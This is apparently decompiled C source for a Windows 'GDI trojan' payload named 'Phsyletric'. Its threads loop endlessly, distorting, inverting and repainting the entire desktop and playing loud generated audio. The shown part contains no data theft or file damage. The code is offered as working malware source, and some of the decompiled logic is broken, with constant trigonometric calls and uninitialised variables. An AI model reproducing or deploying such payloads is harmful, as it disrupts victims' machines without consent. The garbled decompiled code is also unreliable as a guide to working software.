#include <windows.h>
#include <cmath>
#pragma comment (lib, "Winmm.lib")
#define _DWORD DWORD //gamer move

void __stdcall StartAddress(LPVOID lpThreadParameter)
{
	int v1; // edi
	HDC v2; // esi
	int v3; // edi
	int v4; // ebx
	bool v5; // zf
	signed int v6; // eax
	int cy; // [esp+Ch] [ebp-8h]
	int v8; // [esp+10h] [ebp-4h]

	GetDC(0);
	v1 = GetSystemMetrics(0);
	v8 = v1;
	cy = GetSystemMetrics(1);
	while (1)
	{
		v2 = GetDC(0);
		v3 = rand() % v1;
		v4 = rand() % cy;
		v6 = rand() & 0x80000003;
		v5 = v6 == 0;
		if (v6 < 0)
			v5 = (((BYTE)v6 - 1) | 0xFFFFFFFC) == -1;
		if (v5)
			break;
		if (rand() % 4 == 1)
		{
			BitBlt(v2, v3, -1, -10, cy, v2, v3, 0, 0xEE0086u);
		LABEL_8:
			Sleep(1u);
			v1 = v8;
		}
		else if (rand() % 4 == 2)
		{
			v1 = v8;
			BitBlt(v2, 1, v4, v8, 66, v2, 0, v4, 0xEE0086u);
			Sleep(1u);
		}
		else
		{
			v1 = v8;
			if (rand() % 4 == 3)
			{
				BitBlt(v2, -1, v4, v8, -66, v2, 0, v4, 0xEE0086u);
				Sleep(1u);
			}
		}
	}
	BitBlt(v2, v3, 1, 10, cy, v2, v3, 0, 0xEE0086u);
	goto LABEL_8;
}
MMRESULT sub_402D60()
{
	unsigned int i; // esi
	struct wavehdr_tag pwh; // [esp+10h] [ebp-EA640h]
	HWAVEOUT phwo; // [esp+30h] [ebp-EA620h]
	WAVEFORMATEX pwfx; // [esp+34h] [ebp-EA61Ch]
	char v5[960004]; // [esp+48h] [ebp-EA608h]

	phwo = 0;
	pwfx.cbSize = 0;
	*(DWORD *)&pwfx.wFormatTag = 65537;
	pwfx.nSamplesPerSec = 32000;
	pwfx.nAvgBytesPerSec = 32000;
	*(DWORD *)&pwfx.nBlockAlign = 524289;
	waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0, 0, 0);
	memset(v5, 0, 0xEA600u);
	for (i = 0; i < 0xEA600; ++i)
		v5[i] = (int)((double)((i >> 4) * (char)(i >> 3)) *i);
	pwh.dwBufferLength = 960000;
	pwh.lpData = v5;
	pwh.dwBytesRecorded = 0;
	pwh.dwUser = 0;
	pwh.dwFlags = 0;
	pwh.dwLoops = 0;
	pwh.lpNext = 0;
	pwh.reserved = 0;
	waveOutPrepareHeader(phwo, &pwh, 0x20u);
	waveOutWrite(phwo, &pwh, 0x20u);
	waveOutUnprepareHeader(phwo, &pwh, 0x20u);
	return waveOutClose(phwo);
}
void __stdcall sub_401130(LPVOID lpThreadParameter)
{
	int v1; // ebx
	int v2; // edi
	HDC v3; // esi
	bool v4; // zf
	signed int v5; // eax
	int v6; // edx
	int v7; // edi
	int v8; // ecx
	HRGN v9; // eax
	int v10; // edx
	int v11; // edi
	int v12; // ecx
	HRGN v13; // eax
	int hDest; // [esp+Ch] [ebp-10h]
	int v15; // [esp+10h] [ebp-Ch]
	int v16; // [esp+14h] [ebp-8h]
	int v17; // [esp+14h] [ebp-8h]
	int hSrc; // [esp+18h] [ebp-4h]

	GetDC(0);
	v1 = GetSystemMetrics(0);
	v2 = GetSystemMetrics(1);
	hSrc = v2;
	while (1)
	{
		v3 = GetDC(0);
		SetStretchBltMode(v3, 4);
		v5 = rand() & 0x80000001;
		v4 = v5 == 0;
		if (v5 < 0)
			v4 = (((BYTE)v5 - 1) | 0xFFFFFFFE) == -1;
		if (v4)
		{
			v15 = rand() % v1;
			v6 = rand() % v2;
			v7 = 5;
			v8 = v6;
			v16 = v6;
			do
			{
				v9 = CreateEllipticRgn(v15 - v15 / v7, v16 + v16 / v7, v15 + 0x7D0u / v7, v8 - 0x3B6u / v7);
				SelectClipRgn(v3, v9);
				StretchBlt(v3, 1, 1, v1 - 2, hSrc - 2, v3, 0, 0, v1, hSrc, 0xCC0020u);
				v8 = v16;
				++v7;
			} while (v7 < 16);
			v2 = hSrc;
		}
		else if (rand() % 2 == 1)
		{
			hDest = rand() % v1;
			v10 = rand() % v2;
			v11 = 5;
			v12 = v10;
			v17 = v10;
			do
			{
				v13 = CreateEllipticRgn(hDest - hDest / v11, v17 + v17 / v11, hDest + 0x7D0u / v11, v12 - 0x3B6u / v11);
				SelectClipRgn(v3, v13);
				StretchBlt(v3, -1, -1, v1 + 2, hSrc + 2, v3, 0, 0, v1, hSrc, 0xCC0020u);
				v12 = v17;
				++v11;
			} while (v11 < 16);
			v2 = hSrc;
		}
	}
}
void __stdcall sub_4012D0(LPVOID lpThreadParameter)
{
	HWND v1; // eax
	int v2; // ebx
	int v3; // esi
	int v4; // et2
	int v5; // ebx
	int v6; // et2
	unsigned int v7; // esi
	int v8; // ecx
	int v9; // ebx
	int v10; // edi
	int v11; // edi
	int v12; // ebx
	int v13; // eax
	HBRUSH v14; // eax
	int i; // [esp+Ch] [ebp-38h]
	int v16; // [esp+10h] [ebp-34h]
	int v17; // [esp+14h] [ebp-30h]
	int v18; // [esp+18h] [ebp-2Ch]
	HRGN hrgn; // [esp+1Ch] [ebp-28h]
	int x; // [esp+20h] [ebp-24h]
	int y; // [esp+24h] [ebp-20h]
	HDC hdc; // [esp+28h] [ebp-1Ch]
	struct tagRECT Rect; // [esp+2Ch] [ebp-18h]

	v1 = GetDesktopWindow();
	GetWindowRect(v1, &Rect);
	v2 = Rect.right - Rect.top + 500;
	v3 = Rect.bottom - Rect.top + 500;
	v16 = Rect.right - Rect.top + 500;
	for (i = Rect.bottom - Rect.top + 500; ; v3 = i)
	{
		v4 = rand() % v2;
		v5 = v4 - 500;
		v18 = v4 - 500;
		v6 = rand() % v3;
		v7 = 0;
		v8 = v6 - 500;
		v17 = v6 - 500;
		do
		{
			v9 = v5 - (v7 >> 1);
			x = v9;
			v10 = v8 - (v7 >> 1);
			y = v8 - (v7 >> 1);
			hdc = GetDC(0);
			hrgn = CreateEllipticRgn(v9, v10, v9 + v7, v10 + v7);
			v11 = (unsigned __int8)(rand() % 255) << 8;
			v12 = (v11 | (unsigned __int8)(rand() % 255)) << 8;
			v13 = rand();
			v14 = CreateSolidBrush(v12 | (unsigned __int8)(v13 % 255));
			SelectObject(hdc, v14);
			BitBlt(hdc, x, y, v7, v7, hdc, x, y, 0x2837E28u);
			SelectClipRgn(hdc, hrgn);
			DeleteObject(hrgn);
			ReleaseDC(0, hdc);
			Sleep(0x19u);
			v5 = v18;
			v7 += 100;
			v8 = v17;
		} while ((int)v7 < 1000);
		v2 = v16;
	}
}
MMRESULT sub_402F30()
{
	unsigned int i; // esi
	struct wavehdr_tag pwh; // [esp+8h] [ebp-EA640h]
	HWAVEOUT phwo; // [esp+28h] [ebp-EA620h]
	WAVEFORMATEX pwfx; // [esp+2Ch] [ebp-EA61Ch]
	char v5[960004]; // [esp+40h] [ebp-EA608h]

	phwo = 0;
	pwfx.cbSize = 0;
	*(DWORD *)&pwfx.wFormatTag = 65537;
	pwfx.nSamplesPerSec = 32000;
	pwfx.nAvgBytesPerSec = 32000;
	*(DWORD *)&pwfx.nBlockAlign = 524289;
	waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0, 0, 0);
	memset(v5, 0, 0xEA600u);
	for (i = 0; i < 0xEA600; ++i)
		v5[i] = (int)((double)i + (double)((i >> 4) * BYTE(i)));
	pwh.dwBufferLength = 960000;
	pwh.lpData = v5;
	pwh.dwBytesRecorded = 0;
	pwh.dwUser = 0;
	pwh.dwFlags = 0;
	pwh.dwLoops = 0;
	pwh.lpNext = 0;
	pwh.reserved = 0;
	waveOutPrepareHeader(phwo, &pwh, 0x20u);
	waveOutWrite(phwo, &pwh, 0x20u);
	waveOutUnprepareHeader(phwo, &pwh, 0x20u);
	return waveOutClose(phwo);
}
void __stdcall sub_401410(LPVOID lpThreadParameter)
{
	HDC(__stdcall *v1)(HWND); // ebx
	int v2; // edi
	int v3; // esi
	HDC v4; // ebx
	int v5; // edi
	int v6; // esi
	double v7; // xmm2_8
	double v8; // xmm0_8
	int v9; // [esp+10h] [ebp-10h]
	int cy; // [esp+14h] [ebp-Ch]
	double v11; // [esp+18h] [ebp-8h]
	double v12; // [esp+18h] [ebp-8h]

	v1 = GetDC;
	GetDC(0);
	v2 = GetSystemMetrics(0);
	v9 = v2;
	v3 = GetSystemMetrics(1);
	for (cy = v3; ; v3 = cy)
	{
		v4 = v1(0);
		v5 = rand() % v2;
		v6 = rand() % v3;
		rand();
		v11 = (double )cos(2);
		rand();
		v7 = (double)cos(2);
		BitBlt(v4, v5, v6, v9, cy, v4, (int)((double)v5 + v7), (int)((double)v6 + v11), 0xCC0020u);
		rand();
		v12 = (double)cos(2);
		rand();
		v8 = (double)cos(2);
		BitBlt(v4, v5, v6, -v9, -cy, v4, (int)(v8 + (double)v5), (int)(v12 + (double)v6), 0xCC0020u);
		Sleep(5u);
		v1 = GetDC;
		v2 = v9;
	}
}
MMRESULT sub_4030E0()
{
	unsigned int i; // esi
	struct wavehdr_tag pwh; // [esp+10h] [ebp-75340h]
	HWAVEOUT phwo; // [esp+30h] [ebp-75320h]
	WAVEFORMATEX pwfx; // [esp+34h] [ebp-7531Ch]
	char v5[480004]; // [esp+48h] [ebp-75308h]

	phwo = 0;
	pwfx.cbSize = 0;
	*(DWORD *)&pwfx.wFormatTag = 65537;
	pwfx.nSamplesPerSec = 32000;
	pwfx.nAvgBytesPerSec = 32000;
	*(DWORD *)&pwfx.nBlockAlign = 524289;
	waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0, 0, 0);
	memset(v5, 0, 0x75300u);
	for (i = 0; i < 0x75300; ++i)
		v5[i] = (int)((double)(i * (char)(i >> 1)) - (double)tan(2) * (double)i);
	pwh.dwBufferLength = 480000;
	pwh.lpData = v5;
	pwh.dwBytesRecorded = 0;
	pwh.dwUser = 0;
	pwh.dwFlags = 0;
	pwh.dwLoops = 0;
	pwh.lpNext = 0;
	pwh.reserved = 0;
	waveOutPrepareHeader(phwo, &pwh, 0x20u);
	waveOutWrite(phwo, &pwh, 0x20u);
	waveOutUnprepareHeader(phwo, &pwh, 0x20u);
	return waveOutClose(phwo);
}
void sub_401580( LPVOID lpThreadParameter)
{
	HDC(__stdcall *v3)(HWND); // ebx
	double i; // xmm0_8
	HDC v5; // ebx
	int v6; // esi
	int v7; // edi
	int v8; // eax
	HBRUSH v9; // eax
	int v10; // edi
	int v11; // esi
	int cy; // [esp+10h] [ebp-10h]
	int v13; // [esp+14h] [ebp-Ch]
	double v14; // [esp+18h] [ebp-8h]

	v3 = GetDC;
	GetDC(0);
	v13 = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	for (i = 0.0; ; i = fmod(v14 + 0.6283185307179586, 15.70796326794897))
	{
		v14 = i;
		v5 = v3(0);
		v6 = (unsigned __int8)(rand() % 311) << 8;
		v7 = (v6 | (unsigned __int8)(rand() % 431)) << 8;
		v8 = rand();
		v9 = CreateSolidBrush(v7 | (unsigned __int8)(v8 % 123));
		SelectObject(v5, v9);
		v10 = (int)(sin(2) * 5.0);
		v11 = (int)(5.0);
		BitBlt(v5, v11, v10, v13, cy, v5, 0, 0, 0x9273ECEF);
		BitBlt(v5, v11, v10, v13, cy, v5, 0, 0, 0x8800C6u);
		Sleep(0xAu);
		v3 = GetDC;
	}
}
MMRESULT sub_403290()
{
	unsigned int i; // esi
	struct wavehdr_tag pwh; // [esp+8h] [ebp-C3540h]
	HWAVEOUT phwo; // [esp+28h] [ebp-C3520h]
	WAVEFORMATEX pwfx; // [esp+2Ch] [ebp-C351Ch]
	char v5[800004]; // [esp+40h] [ebp-C3508h]

	phwo = 0;
	pwfx.cbSize = 0;
	*(DWORD *)&pwfx.wFormatTag = 65537;
	pwfx.nSamplesPerSec = 32000;
	pwfx.nAvgBytesPerSec = 32000;
	*(DWORD *)&pwfx.nBlockAlign = 524289;
	waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0, 0, 0);
	memset(v5, 0, 0xC3500u);
	for (i = 0; i < 0xC3500; ++i)
		v5[i] = (int)(tan(2) * (double)i + (double)((i >> 8) * (char)(i >> 6)));
	pwh.dwBufferLength = 800000;
	pwh.lpData = v5;
	pwh.dwBytesRecorded = 0;
	pwh.dwUser = 0;
	pwh.dwFlags = 0;
	pwh.dwLoops = 0;
	pwh.lpNext = 0;
	pwh.reserved = 0;
	waveOutPrepareHeader(phwo, &pwh, 0x20u);
	waveOutWrite(phwo, &pwh, 0x20u);
	waveOutUnprepareHeader(phwo, &pwh, 0x20u);
	return waveOutClose(phwo);
}
int sub_4016B0()
{
	HDC v0; // eax
	HDC v1; // eax
	HDC v2; // edi
	int v3; // eax
	int v4; // ebx
	HWND v5; // eax
	int v6; // esi
	int v7; // edi
	int v8; // eax
	HBRUSH v9; // eax
	int v10; // eax
	int result; // eax
	int v12; // et2
	HBITMAP ho; // [esp+10h] [ebp-40h]
	int v14; // [esp+14h] [ebp-3Ch]
	int cy; // [esp+18h] [ebp-38h]
	HDC hdcDest; // [esp+1Ch] [ebp-34h]
	HDC hdc; // [esp+20h] [ebp-30h]
	struct tagRECT Rect; // [esp+24h] [ebp-2Ch]
	POINT Point; // [esp+34h] [ebp-1Ch]
	int v20; // [esp+3Ch] [ebp-14h]
	int v21; // [esp+40h] [ebp-10h]
	int v22; // [esp+44h] [ebp-Ch]
	int v23; // [esp+48h] [ebp-8h]

	v0 = GetDC(0);
	hdc = v0;
	v1 = CreateCompatibleDC(v0);
	v2 = v1;
	hdcDest = v1;
	v3 = GetSystemMetrics(0);
	v4 = v3;
	v14 = v3;
	cy = GetSystemMetrics(1);
	ho = CreateCompatibleBitmap(hdc, v4, cy);
	SelectObject(v2, ho);
	v5 = GetDesktopWindow();
	GetWindowRect(v5, &Rect);
	Point.x = Rect.left + 19;
	Point.y = Rect.top - 90;
	v20 = Rect.right + 10;
	v21 = Rect.top + 18;
	v22 = Rect.left - 70;
	v23 = Rect.bottom - 90;
	PlgBlt(hdcDest, &Point, hdc, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
	v6 = (unsigned __int8)(rand() % 255) << 8;
	v7 = (v6 | (unsigned __int8)(rand() % 255)) << 8;
	v8 = rand();
	v9 = CreateSolidBrush(v7 | (unsigned __int8)(v8 % 255));
	SelectObject(hdc, v9);
	BitBlt(hdc, 0, 0, v14, cy, hdcDest, 0, 0, 0x2837E28u);
	DeleteDC(hdc);
	DeleteObject(ho);
	v10 = rand();
	v12 = v10 % 10;
	result = v10 / 10;
	if (v12 == 4)
		result = InvalidateRect(0, 0, 0);
	return result;
}
int sub_401810()
{
	HDC v0; // eax
	HDC v1; // eax
	HDC v2; // edi
	int v3; // eax
	int v4; // ebx
	HWND v5; // eax
	int v6; // esi
	int v7; // edi
	int v8; // eax
	HBRUSH v9; // eax
	int v10; // eax
	int result; // eax
	int v12; // et2
	HBITMAP ho; // [esp+10h] [ebp-40h]
	int v14; // [esp+14h] [ebp-3Ch]
	int cy; // [esp+18h] [ebp-38h]
	HDC hdcDest; // [esp+1Ch] [ebp-34h]
	HDC hdc; // [esp+20h] [ebp-30h]
	struct tagRECT Rect; // [esp+24h] [ebp-2Ch]
	POINT Point; // [esp+34h] [ebp-1Ch]
	int v20; // [esp+3Ch] [ebp-14h]
	int v21; // [esp+40h] [ebp-10h]
	int v22; // [esp+44h] [ebp-Ch]
	int v23; // [esp+48h] [ebp-8h]

	v0 = GetDC(0);
	hdc = v0;
	v1 = CreateCompatibleDC(v0);
	v2 = v1;
	hdcDest = v1;
	v3 = GetSystemMetrics(0);
	v4 = v3;
	v14 = v3;
	cy = GetSystemMetrics(1);
	ho = CreateCompatibleBitmap(hdc, v4, cy);
	SelectObject(v2, ho);
	v5 = GetDesktopWindow();
	GetWindowRect(v5, &Rect);
	Point.x = Rect.left - 19;
	Point.y = Rect.top + 90;
	v20 = Rect.right - 10;
	v21 = Rect.top - 18;
	v22 = Rect.left + 70;
	v23 = Rect.bottom + 90;
	PlgBlt(hdcDest, &Point, hdc, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
	v6 = (unsigned __int8)(rand() % 255) << 8;
	v7 = (v6 | (unsigned __int8)(rand() % 255)) << 8;
	v8 = rand();
	v9 = CreateSolidBrush(v7 | (unsigned __int8)(v8 % 255));
	SelectObject(hdc, v9);
	BitBlt(hdc, 0, 0, v14, cy, hdcDest, 0, 0, 0x2837E28u);
	DeleteDC(hdc);
	DeleteObject(ho);
	v10 = rand();
	v12 = v10 % 10;
	result = v10 / 10;
	if (v12 == 4)
		result = InvalidateRect(0, 0, 0);
	return result;
}
void __stdcall sub_401970(LPVOID lpThreadParameter)
{
	while (1)
	{
		sub_4016B0();
		sub_401810();
		sub_401810();
		sub_4016B0();
	}
}
void sub_401990(LPVOID lpThreadParameter)
{
	HDC(__stdcall *v3)(HWND); // ebx
	int v4; // esi
	int v5; // edi
	double v6; // xmm0_8
	HDC v7; // ebx
	int v8; // esi
	int v9; // edi
	int v10; // eax
	int v11; // esi
	int v12; // edi
	int v13; // eax
	double v14 = 0; // xmm0_8
	int v15; // edi
	int v16; // [esp-24h] [ebp-4Ch]
	int v17 = 0; // [esp-Ch] [ebp-34h]
	int hDest; // [esp+10h] [ebp-18h]
	int wDest; // [esp+14h] [ebp-14h]
	int v20; // [esp+18h] [ebp-10h]
	int v21; // [esp+1Ch] [ebp-Ch]
	double v22; // [esp+20h] [ebp-8h]
	double i; // [esp+20h] [ebp-8h]

	v3 = GetDC;
	GetDC(0);
	wDest = GetSystemMetrics(0);
	v4 = wDest;
	v5 = GetSystemMetrics(1);
	hDest = v5;
	v6 = 0.0;
	while (1)
	{
		v22 = v6;
		v7 = v3(0);
		v21 = rand() % v4;
		v20 = rand() % v5;
		v8 = (unsigned __int8)(rand() % 255) << 8;
		v9 = (v8 | (unsigned __int8)(rand() % 255)) << 8;
		v10 = rand();
		SetTextColor(v7, v9 | (unsigned __int8)(v10 % 255));
		v11 = (unsigned __int8)(rand() % 155) << 8;
		v12 = (v11 | (unsigned __int8)(rand() % 155)) << 8;
		v13 = rand();
		SetBkColor(v7, v12 | (unsigned __int8)(v13 % 155));
		v4 = wDest;
		v16 = (int)( 500.0);
		StretchBlt(v7, (int)(v14 * 500.0), v16, wDest, hDest, v7, 0, 0, wDest, hDest, 0xCC0020u);
		v15 = 5;
		for (i = fmod(v22 + 0.006283185307179587, 1570.796326794896); v15 < wDest + hDest; v4 = wDest)
		{
			
			TextOutW(v7, v21 + 2, v17, L"Phsyletric", 10);
			v15 += 11;
		}
		Sleep(0xAu);
		if (rand() % 10 == 4)
			InvalidateRect(0, 0, 0);
		v6 = i;
		v5 = hDest;
		v3 = GetDC;
	}
}
MMRESULT sub_403440()
{
	unsigned int i; // ebx
	struct wavehdr_tag pwh; // [esp+8h] [ebp-75340h]
	HWAVEOUT phwo; // [esp+28h] [ebp-75320h]
	WAVEFORMATEX pwfx; // [esp+2Ch] [ebp-7531Ch]
	char v5[480004]; // [esp+40h] [ebp-75308h]

	phwo = 0;
	pwfx.cbSize = 0;
	*(DWORD *)&pwfx.wFormatTag = 65537;
	pwfx.nSamplesPerSec = 32000;
	pwfx.nAvgBytesPerSec = 32000;
	*(DWORD *)&pwfx.nBlockAlign = 524289;
	waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0, 0, 0);
	memset(v5, 0, 0x75300u);
	for (i = 0; i < 0x75300; ++i)
		v5[i] = (int)((double)i + (double)((char)i * (i >> 1)));
	pwh.dwBufferLength = 480000;
	pwh.lpData = v5;
	pwh.dwBytesRecorded = 0;
	pwh.dwUser = 0;
	pwh.dwFlags = 0;
	pwh.dwLoops = 0;
	pwh.lpNext = 0;
	pwh.reserved = 0;
	waveOutPrepareHeader(phwo, &pwh, 0x20u);
	waveOutWrite(phwo, &pwh, 0x20u);
	waveOutUnprepareHeader(phwo, &pwh, 0x20u);
	return waveOutClose(phwo);
}
void sub_401BB0(LPVOID lpThreadParameter)
{
	int v1; // edi
	int v2; // esi
	int v3; // esi
	int v4; // esi
	int v5; // edi
	HDC v6; // esi
	COLORREF v7; // eax
	HBRUSH v8; // eax
	int v9; // eax
	int y; // [esp+10h] [ebp-1Ch]
	int v11; // [esp+14h] [ebp-18h]
	int v12; // [esp+18h] [ebp-14h]
	int v13; // [esp+1Ch] [ebp-10h]
	int cy; // [esp+20h] [ebp-Ch]
	int v15; // [esp+24h] [ebp-8h]
	int w; // [esp+28h] [ebp-4h]

	v1 = GetSystemMetrics(0);
	w = v1;
	v2 = 0;
	v15 = GetSystemMetrics(1);
LABEL_2:
	v11 = v2;
	if (!v2)
		RedrawWindow(0, 0, 0, 0x85u);
	v3 = 0;
	v12 = 0;
	if (rand() % 3 <= 0)
		goto LABEL_17;
LABEL_5:
	v13 = 0;
	if (rand() % 10 <= 0)
		goto LABEL_16;
	v4 = v15 / -2;
	while (1)
	{
		y = rand() % v1;
		cy = v15 + 58 + v4 - rand() % v15;
		v5 = rand() % 3;
		v6 = GetDC(0);
		if (!v5)
			break;
		if (v5 == 1)
		{
			v7 = (unsigned __int8)(rand() % 100 - 101) << 8;
			goto LABEL_13;
		}
		if (v5 == 2)
		{
			v7 = (unsigned __int8)(rand() % 100 - 101) << 16;
			goto LABEL_13;
		}
	LABEL_14:
		v9 = rand();
		BitBlt(v6, 0, y, w, cy, v6, v9 % 244 - 112, y, 0xCC0020u);
		PatBlt(v6, 0, y, w, cy, 0x5A0049u);
		++v13;
		v1 = w;
		v4 = v15 / -2;
		if (v13 >= rand() % 10)
		{
			v3 = v12;
		LABEL_16:
			Sleep(1u);
			v12 = ++v3;
			if (v3 >= rand() % 3)
			{
			LABEL_17:
				v2 = (v11 + 1) / -9 + v11 + 1 + 8 * ((v11 + 1) / -9);
				goto LABEL_2;
			}
			goto LABEL_5;
		}
	}
	v7 = (unsigned __int8)(rand() % 100 - 101);
LABEL_13:
	v8 = CreateSolidBrush(v7);
	SelectObject(v6, v8);
	goto LABEL_14;
}
MMRESULT sub_4035F0()
{
	unsigned int i; // eax
	struct wavehdr_tag pwh; // [esp+0h] [ebp-C3540h]
	HWAVEOUT phwo; // [esp+20h] [ebp-C3520h]
	WAVEFORMATEX pwfx; // [esp+24h] [ebp-C351Ch]
	char v5[800004]; // [esp+38h] [ebp-C3508h]

	phwo = 0;
	pwfx.cbSize = 0;
	*(DWORD *)&pwfx.wFormatTag = 65537;
	pwfx.nSamplesPerSec = 32000;
	pwfx.nAvgBytesPerSec = 32000;
	*(_DWORD *)&pwfx.nBlockAlign = 524289;
	waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0, 0, 0);
	memset(v5, 0, 0xC3500u);
	for (i = 0; i < 0xC3500; ++i)
		v5[i] = i & 0x5F ^ ((i & 0xC7) - (i >> 4));
	pwh.dwBufferLength = 800000;
	pwh.lpData = v5;
	pwh.dwBytesRecorded = 0;
	pwh.dwUser = 0;
	pwh.dwFlags = 0;
	pwh.dwLoops = 0;
	pwh.lpNext = 0;
	pwh.reserved = 0;
	waveOutPrepareHeader(phwo, &pwh, 0x20u);
	waveOutWrite(phwo, &pwh, 0x20u);
	waveOutUnprepareHeader(phwo, &pwh, 0x20u);
	return waveOutClose(phwo);
}
void sub_401D80(LPVOID lpThreadParameter)
{
	double v3; // xmm0_8
	double v4; // xmm1
	int v5 = 0; // edi
	HDC v6; // eax
	int v7; // ecx
	HDC v8; // esi
	double v9 = 0; // xmm0_8
	double v10; // xmm0
	double v11 = 0; // xmm0_8
	double v12 = 0; // xmm0_8
	double v13 = 0; // xmm0_8
	HDC v14; // [esp-10h] [ebp-28h]
	int cy; // [esp+8h] [ebp-10h]
	int v16; // [esp+Ch] [ebp-Ch]
	double v17; // [esp+10h] [ebp-8h]

	GetDC(0);
	v16 = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	while (1)
	{
		v6 = GetDC(0);
		v7 = v5;
		v8 = v6;
		++v5;
		if (v7)
		{
			v14 = v6;
			
			BitBlt(v8, (int)v9, 0, v16, cy, v14, 0, 0, 0xCC0020u);
			
		}
		else
		{
			v10 = 0x3FF0000000000000u;
		}
		
		BitBlt(v8, (int)-v11, 0, v16, cy, v8, 0, 0, 0xCC0020u);
		
		BitBlt(v8, 0, (int)v12, v16, cy, v8, 0, 0, 0xCC0020u);
		
		BitBlt(v8, 0, (int)-v13, v16, cy, v8, 0, 0, 0xCC0020u);
	}
}
MMRESULT sub_403740()
{
	unsigned int i; // eax
	struct wavehdr_tag pwh; // [esp+8h] [ebp-C3540h]
	HWAVEOUT phwo; // [esp+28h] [ebp-C3520h]
	WAVEFORMATEX pwfx; // [esp+2Ch] [ebp-C351Ch]
	char v5[800004]; // [esp+40h] [ebp-C3508h]

	phwo = 0;
	pwfx.cbSize = 0;
	*(DWORD *)&pwfx.wFormatTag = 65537;
	pwfx.nSamplesPerSec = 32000;
	pwfx.nAvgBytesPerSec = 32000;
	*(DWORD *)&pwfx.nBlockAlign = 524289;
	waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0, 0, 0);
	memset(v5, 0, 0xC3500u);
	for (i = 0; i < 0xC3500; ++i)
		v5[i] = (6 * i) | (9 * i) | (i >> 1) | (i >> 9) | (i >> 11);
	pwh.dwBufferLength = 800000;
	pwh.lpData = v5;
	pwh.dwBytesRecorded = 0;
	pwh.dwUser = 0;
	pwh.dwFlags = 0;
	pwh.dwLoops = 0;
	pwh.lpNext = 0;
	pwh.reserved = 0;
	waveOutPrepareHeader(phwo, &pwh, 0x20u);
	waveOutWrite(phwo, &pwh, 0x20u);
	waveOutUnprepareHeader(phwo, &pwh, 0x20u);
	return waveOutClose(phwo);
}
void __stdcall sub_401EC0(LPVOID lpThreadParameter)
{
	int v1; // ebx
	HWND v2; // esi
	int v3; // esi
	int v4; // edi
	int v5; // eax
	HBRUSH v6; // eax
	int v7; // ebx
	int v8; // esi
	int v9; // eax
	int v10; // edi
	HDC v11; // ebx
	int v12; // [esp-8h] [ebp-50h]
	HDC hdc; // [esp+Ch] [ebp-3Ch]
	int wSrc; // [esp+10h] [ebp-38h]
	int x; // [esp+14h] [ebp-34h]
	int y; // [esp+18h] [ebp-30h]
	struct tagRECT Rect; // [esp+1Ch] [ebp-2Ch]
	POINT Point; // [esp+2Ch] [ebp-1Ch]
	int v19; // [esp+34h] [ebp-14h]
	int v20; // [esp+38h] [ebp-10h]
	int v21; // [esp+3Ch] [ebp-Ch]
	int v22; // [esp+40h] [ebp-8h]

	while (1)
	{
		wSrc = GetSystemMetrics(0);
		v1 = GetSystemMetrics(1);
		y = v1;
		v2 = GetDesktopWindow();
		hdc = GetDC(0);
		GetWindowRect(v2, &Rect);
		v3 = (unsigned __int8)(rand() % 255) << 8;
		v4 = (v3 | (unsigned __int8)(rand() % 255)) << 8;
		v5 = rand();
		v6 = CreateSolidBrush(v4 | (unsigned __int8)(v5 % 255));
		SelectObject(hdc, v6);
		x = rand() % wSrc;
		v7 = wSrc / -2 - rand() % wSrc + 110 + v1;
		Point.x = Rect.left + 61;
		Point.y = Rect.top - 61;
		v19 = Rect.right + 61;
		v20 = Rect.top + 61;
		v21 = Rect.left - 61;
		v22 = Rect.bottom - 61;
		PlgBlt(hdc, &Point, hdc, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
		PlgBlt(hdc, &Point, hdc, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
		v8 = x;
		v9 = rand();
		v10 = y;
		BitBlt(hdc, v8, y, v8, v7, hdc, v9 % 100 - 50, x, 0xCC0020u);
		v12 = v7;
		v11 = hdc;
		PatBlt(hdc, v8, y, v8, v12, 0x5A0049u);
		StretchBlt(v11, -16, -16, wSrc + 32, v10 + 32, v11, 0, 0, wSrc, v10, 0xCC0020u);
		StretchBlt(v11, 16, 16, wSrc - 32, v10 - 32, v11, 0, 0, wSrc, v10, 0xCC0020u);
	}
}
void __stdcall sub_402090(LPVOID lpThreadParameter)
{
	HWND v1; // esi
	int v2; // esi
	int v3; // edi
	int v4; // eax
	int v5; // esi
	int v6; // ebx
	int v7; // eax
	int v8; // edi
	int v9; // esi
	HDC v10; // ebx
	int i; // [esp+10h] [ebp-28h]
	double v12; // [esp+10h] [ebp-28h]
	HDC hdc; // [esp+18h] [ebp-20h]
	double hdca; // [esp+18h] [ebp-20h]
	struct tagRECT Rect; // [esp+24h] [ebp-14h]

	while (1)
	{
		v1 = GetDesktopWindow();
		GetWindowDC(v1);
		hdc = GetDC(0);
		GetWindowRect(v1, &Rect);
		v2 = (unsigned __int8)(rand() % 255) << 8;
		v3 = (v2 | (unsigned __int8)(rand() % 255)) << 8;
		v4 = rand();
		v5 = Rect.right;
		v6 = 0;
		v7 = v3 | (unsigned __int8)(v4 % 255);
		v8 = Rect.bottom;
		for (i = v7; v6 < Rect.right; v6 += 20)
		{
			v9 = 0;
			if (v8 > 0)
			{
				do
				{
					SetPixel(hdc, v6, v9, v7);
					v8 = Rect.bottom;
					v9 += 20;
					v7 = i;
				} while (v9 < Rect.bottom);
			}
			v5 = Rect.right;
		}
		v10 = hdc;
		v12 = -2000.0;
		while (1)
		{
			hdca = 100.0;
			BitBlt(v10, (int)(v12 + 200.0), (int)(hdca + 200.0), v5, v8, v10, 0, 0, 0xCC0020u);
			BitBlt(v10, (int)(v12 + 400.0), (int)(hdca + 400.0), Rect.right, Rect.bottom, v10, 0, 0, 0xCC0020u);
			BitBlt(v10, (int)(v12 + 600.0), (int)(hdca + 600.0), Rect.right, Rect.bottom, v10, 0, 0, 0xCC0020u);
			v12 = v12 + 0.01;
			if (v12 >= 2000.0)
				break;
